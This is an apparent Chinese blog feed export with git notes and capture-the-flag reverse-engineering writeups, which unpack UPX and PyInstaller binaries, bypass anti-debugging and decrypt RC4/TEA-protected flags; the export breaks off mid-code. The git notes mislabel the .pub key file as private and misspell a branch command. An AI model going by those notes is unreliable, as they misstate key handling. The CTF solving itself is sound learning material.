        <content type="html"><![CDATA[<h2 id="Git学习">Git学习</h2><p>易于调试优化迭代，用于版本管理</p><h3 id="版本控制">版本控制</h3><p>历史记录，还原内容</p><h3 id="基本操作">基本操作</h3><h4 id="创建本地仓库">创建本地仓库</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir xxx</span><br><span class="line">cd xxx</span><br><span class="line">git init</span><br></pre></td></tr></table></figure><p>配置用户名/邮箱</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;xxxx&quot;</span><br><span class="line">git config --global user.email &quot;xxx@qq.com&quot;</span><br></pre></td></tr></table></figure><h4 id="提交内容">提交内容</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add xxx #将某个内容暂存</span><br><span class="line">git add . #把所有已修改文件移到暂存区</span><br><span class="line">git status #查看当前状态</span><br><span class="line">git commit -m &quot;注释说明&quot; #提交已暂存的文件</span><br></pre></td></tr></table></figure><p>文件状态</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">已修改：处于工作区</span><br><span class="line">已暂存：处于暂存区</span><br><span class="line">已提交：处于Git仓库</span><br></pre></td></tr></table></figure><p>其它命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log #查看提交记录</span><br></pre></td></tr></table></figure><h2 id="Github远程仓库操作">Github远程仓库操作</h2><p>创建仓库后，在SSH处得到一个链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add name_of_remote_repository git@github.com:xxx</span><br></pre></td></tr></table></figure><p>配置公私钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot;</span><br></pre></td></tr></table></figure><p>得到了公私钥</p><p>没有pub的是私钥，有pub的是私钥</p><p>在github中找到设置SSH and FPG keys，新建，然后再key中添加pubkey内容。这样就连接好了</p><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>用于验证是否可以连接上</p><p>push：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u name main #name是远程仓库名，main是分支</span><br></pre></td></tr></table></figure><h2 id="分支管理">分支管理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch  #查看当前分支</span><br></pre></td></tr></table></figure><p>分支只是一个指针</p><p>详见：</p><p><a href="https://blog.csdn.net/silence_pinot/article/details/111478596">git的分支管理（详细版）_git分支管理-CSDN博客</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b new_branch_name  #创建一个新分支并切换到这个分支</span><br><span class="line">git breach -d name #删除一个分支</span><br><span class="line">git checkout main #切换回main分支</span><br><span class="line">git merge branch_name #将一个分支（快速合并，只移动指针）合并到主分支</span><br></pre></td></tr></table></figure><p>保存当前工作现场，用于临时切换分支</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git stash  #保存</span><br><span class="line">git stash pop  #恢复</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 开发 </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暑假学习记录1</title>
      <link href="/posts/4ead32f4.html"/>
      <url>/posts/4ead32f4.html</url>
      
        <content type="html"><![CDATA[<div class="note info simple"><p>目录：</p><p><a href="https://www.pri87.vip/posts/4ead32f4.html">学习记录1</a> &lt;=</p><p>学习记录2</p></div><p>想研究一下反调试，所以最近的主线是归纳反调试技术<br>之后会单独写一篇博客来汇总</p><p>然后记录一下最近写的题</p><p>以及在杂方向上面学的东西</p><hr><h2 id="wp">wp:</h2><p><a href="https://www.pri87.vip/posts/1cdc16cf.html">2024春秋杯夏 re wp</a></p><p><a href="https://www.pri87.vip/posts/4f799b15.html">WKCTF-RE部分wp</a></p><h3 id="矩阵杯packpy题目复现：">矩阵杯packpy题目复现：</h3><p>拿到文件，是一个elf，用010打开，发现被upx过，修改一下标志，把upx?改成UPX!，用upx -d去壳</p><p>打开后，发现是一个pyinstaller打包的py文件，用工具反编译成pyc</p><p>然后uncompyle6解码主要pyc，得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.9.13 (tags/v3.9.13:6de2ca5, May 17 2022, 16:36:42) [MSC v.1929 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: packpy.py</span></span><br><span class="line"><span class="keyword">import</span> base58, zlib, marshal</span><br><span class="line">scrambled_code_string = <span class="string">b&#x27;X1XehTQeZCsb4WSLBJBYZMjovD1x1E5wjTHh2w3j8dDxbscVa6HLEBSUTPEMsAcerwYASTaXFsCmWb1RxBfwBd6RmyePv3AevTDUiFAvV1GB94eURvtdrpYez7dF1egrwVz3EcQjHxXrpLXs2APE4MS93sMsgMgDrTFCNwTkPba31Aa2FeCSMu151LvEpwiPq5hvaZQPaY2s4pBpH16gGDoVb9MEvLn5J4cP23rEfV7EzNXMgqLUKF82mH1v7yjVCtYQhR8RprKCCtD3bekHjBH2AwES4QythgjVetUNDRpN5gfeJ99UYbZn1oRQHVmiu1sLjpq2mMm8tTuiZgfMfsktf5Suz2w8DgRX4qBKQijnuU4Jou9hduLeudXkZ85oWx9SU7MCE6gjsvy1u57VYw33vckJU6XGGZgZvSqKGR5oQKJf8MPNZi1dF8yF9MkwDdEq59jFsRUJDv7kNwig8XiuBXvmtJPV963thXCFQWQe8XGSu7kJqeRaBX1pkkQ4goJpgTLDHR1LW7bGcZ7m13KzW5mVmJHax81XLis774FjwWpApmTVuiGC2TQr2RcyUTkhGgC8R4bQiXgCsqZMoWyafcSmjdZsHmE6WgNAqPQmEg9FyjpK5f2XC1DkzuyHan5YceeEDMxKUJgJrmNcdGxB7281EyeriyuWNJVH2rVNhio6yoG&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(marshal.loads(zlib.decompress(base58.b58decode(scrambled_code_string))))</span><br></pre></td></tr></table></figure><p>通过把exec改成print，可以得到这个序列化内容是一个code object</p><p>我们需要把它还原成可读的代码</p><p>在网上搜索资料的时候，发现，py在执行的时候会先被编译成PyCodeObject 对象，然后被保存到pyc文件中</p><p>可以这样导入pyc文件的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="string">&quot;你好啊&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> importlib.machinery <span class="keyword">import</span> SourcelessFileLoader</span><br><span class="line"> </span><br><span class="line">tools = SourcelessFileLoader(</span><br><span class="line">    <span class="string">&quot;tools&quot;</span>, <span class="string">&quot;__pycache__/tools.cpython-38.pyc&quot;</span></span><br><span class="line">).load_module()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(tools.a)  <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(tools.b)  <span class="comment"># 你好啊</span></span><br></pre></td></tr></table></figure><p>可以猜测，marshal反序列化的内容其实可以当成pyc来看，尝试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">scrambled_code_string = <span class="string">b&#x27;X1XehTQeZCsb4WSLBJBYZMjovD1x1E5wjTHh2w3j8dDxbscVa6HLEBSUTPEMsAcerwYASTaXFsCmWb1RxBfwBd6RmyePv3AevTDUiFAvV1GB94eURvtdrpYez7dF1egrwVz3EcQjHxXrpLXs2APE4MS93sMsgMgDrTFCNwTkPba31Aa2FeCSMu151LvEpwiPq5hvaZQPaY2s4pBpH16gGDoVb9MEvLn5J4cP23rEfV7EzNXMgqLUKF82mH1v7yjVCtYQhR8RprKCCtD3bekHjBH2AwES4QythgjVetUNDRpN5gfeJ99UYbZn1oRQHVmiu1sLjpq2mMm8tTuiZgfMfsktf5Suz2w8DgRX4qBKQijnuU4Jou9hduLeudXkZ85oWx9SU7MCE6gjsvy1u57VYw33vckJU6XGGZgZvSqKGR5oQKJf8MPNZi1dF8yF9MkwDdEq59jFsRUJDv7kNwig8XiuBXvmtJPV963thXCFQWQe8XGSu7kJqeRaBX1pkkQ4goJpgTLDHR1LW7bGcZ7m13KzW5mVmJHax81XLis774FjwWpApmTVuiGC2TQr2RcyUTkhGgC8R4bQiXgCsqZMoWyafcSmjdZsHmE6WgNAqPQmEg9FyjpK5f2XC1DkzuyHan5YceeEDMxKUJgJrmNcdGxB7281EyeriyuWNJVH2rVNhio6yoG&#x27;</span></span><br><span class="line">a = zlib.decompress(base58.b58decode(scrambled_code_string))</span><br><span class="line"></span><br><span class="line">HEAD = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;550D0D0A000000000000000000000000&#x27;</span>) <span class="comment">#补充文件头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(HEAD+a)</span><br></pre></td></tr></table></figure><p>输出后，真的可以直接反编译，得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">encdata = <span class="string">b&#x27;\x18\xfa\xadd\xed\xab\xad\x9d\xe5\xc0\xad\xfa\xf9\x0be\xf9\xe5\xade6\xf9\xfd\x88\xf9\x9d\xe5\x9c\xe5\x9de\xc3))\x0f\xff&#x27;</span></span><br><span class="line">hex_output = binascii.hexlify(encdata).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>(<span class="params">seed_value</span>):</span><br><span class="line">    key = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    random.seed(seed_value)</span><br><span class="line">    random.shuffle(key)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        encrypted.append(key[byte] ^ <span class="number">95</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(encrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;input your flag:&#x27;</span>)</span><br><span class="line">    key = generate_key(<span class="built_in">len</span>(flag))</span><br><span class="line">    data = flag.encode()</span><br><span class="line">    encrypted_data = encrypt(data, key)</span><br><span class="line">    <span class="keyword">if</span> encrypted_data == encdata:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;good&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>直接写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(hex_output)</span><br><span class="line">last = [<span class="number">0x18</span>,<span class="number">0xfa</span>,<span class="number">0xad</span>,<span class="number">0x64</span>,<span class="number">0xed</span>,<span class="number">0xab</span>,<span class="number">0xad</span>,<span class="number">0x9d</span>,<span class="number">0xe5</span>,<span class="number">0xc0</span>,<span class="number">0xad</span>,<span class="number">0xfa</span>,<span class="number">0xf9</span>,<span class="number">0x0b</span>,<span class="number">0x65</span>,<span class="number">0xf9</span>,<span class="number">0xe5</span>,<span class="number">0xad</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0xf9</span>,<span class="number">0xfd</span>,<span class="number">0x88</span>,<span class="number">0xf9</span>,<span class="number">0x9d</span>,<span class="number">0xe5</span>,<span class="number">0x9c</span>,<span class="number">0xe5</span>,<span class="number">0x9d</span>,<span class="number">0x65</span>,<span class="number">0xc3</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x0f</span>,<span class="number">0xff</span>]</span><br><span class="line">okey = generate_key(<span class="built_in">len</span>(last))</span><br><span class="line">q = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> okey[j]^<span class="number">95</span>==last[i]:</span><br><span class="line">            q.append(j)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">pl(q)</span><br></pre></td></tr></table></figure><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mar3hal_Is_3asy_t0_r3v3rse!!@&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="ASM">ASM</h2><p>配置VS asm环境，我的VS版本为2022</p><p>CSDN上面写的太抽象了，我在<a href="https://zjlc.top/2022/05/11/assembly/">Windows平台编写汇编语言</a>看到了一个不错的</p><p>大概步骤就是：</p><ul><li><a href="http://www.masm32.com/download.htm">Download The MASM32 SDK</a>下载MASM SDK</li><li>在VS installer 里面下载MSVC V140 生成工具，v141 缓解库，v141 ARM生成工具</li></ul><h2 id="杂项：">杂项：</h2><p><a href="https://www.pri87.vip/posts/ab9e1965.html">git基本操作</a></p><p><a href="https://www.pri87.vip/posts/484c947.html">golang学习</a></p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 记录 </category>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 放假 </tag>
            
            <tag> 开摆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024春秋杯夏 re wp</title>
      <link href="/posts/1cdc16cf.html"/>
      <url>/posts/1cdc16cf.html</url>
      
        <content type="html"><![CDATA[<h1>RE</h1><h2 id="snack">snack</h2><p>pyc解包，pycdc反编译，得到一个rc4加密，复制加密过程直接解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pl</span>(<span class="params">a, b=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= x &lt;= <span class="number">255</span> <span class="keyword">for</span> x <span class="keyword">in</span> a):</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(a[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = (<span class="string">&#x27;&#x27;</span>.join([long_to_bytes(a[i]).decode() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>)]))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> b <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> result.startswith(b):</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b&#125;</span><span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b&#125;</span>&#123;&#123;<span class="subst">&#123;result&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        S[i],S[j] = S[j],S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_stream</span>(<span class="params">S, length</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_stream = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i],S[j] = S[j],S[i]</span><br><span class="line">        key_stream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    S = initialize(key)</span><br><span class="line">    key_stream = generate_key_stream(S, <span class="built_in">len</span>(data))</span><br><span class="line">    decrypted_data = [i^ data[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))]</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line">data = [</span><br><span class="line">    <span class="number">101</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">218</span>,</span><br><span class="line">    <span class="number">172</span>,</span><br><span class="line">    <span class="number">205</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">235</span>,</span><br><span class="line">    <span class="number">195</span>,</span><br><span class="line">    <span class="number">72</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">130</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">213</span>,</span><br><span class="line">    <span class="number">120</span>,</span><br><span class="line">    <span class="number">227</span>,</span><br><span class="line">    <span class="number">193</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">174</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">162</span>,</span><br><span class="line">    <span class="number">248</span>,</span><br><span class="line">    <span class="number">244</span>,</span><br><span class="line">    <span class="number">12</span>,</span><br><span class="line">    <span class="number">238</span>,</span><br><span class="line">    <span class="number">92</span>,</span><br><span class="line">    <span class="number">160</span>,</span><br><span class="line">    <span class="number">203</span>,</span><br><span class="line">    <span class="number">185</span>,</span><br><span class="line">    <span class="number">155</span>]</span><br><span class="line">xor_key = <span class="string">&#x27;V3rY_v3Ry_Ez&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_key)):</span><br><span class="line">    key.append(<span class="built_in">ord</span>(xor_key[i]))</span><br><span class="line">pl(decrypt(data, key))</span><br><span class="line"><span class="comment"># flag&#123;KMLTz3lT_MePUDa7A_P5LpzCBT&#125;</span></span><br></pre></td></tr></table></figure><h2 id="HardSignin">HardSignin</h2><p>先去一个upx</p><p>有4个tls，里面有花和反调，去花杀反调，似乎是用随机数生成之后加密用的参数，同时对main解密</p><p><img src="https://s2.loli.net/2024/07/06/372SLiaWRdXwg8y.png" alt="image-20240706182721253"></p><p><img src="https://s2.loli.net/2024/07/06/CpvJHoiGXSOcxrA.png" alt="image-20240706195234707"></p><p><img src="https://s2.loli.net/2024/07/06/oarzEjK6tcLyWxD.png" alt="image-20240706195330050"></p><p>在tls2里面下断点到这里已经生成的数据</p><p>main里面3个步骤</p><p><img src="https://s2.loli.net/2024/07/06/igZvC3mJDLPh1Xr.png" alt="image-20240706182810516"></p><p>base64，rc4和tea直接反向解密就好</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">BYTE S[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decTEA</span><span class="params">(<span class="type">unsigned</span>* target, <span class="type">unsigned</span>* key)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">v6 = target[i];</span><br><span class="line">v5 = target[i + <span class="number">1</span>];</span><br><span class="line">sum = <span class="number">0</span> - <span class="number">0x61C88647</span> * <span class="number">0x64</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x64</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">v5 -= (key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)));</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">v6 -= (key[sum &amp; 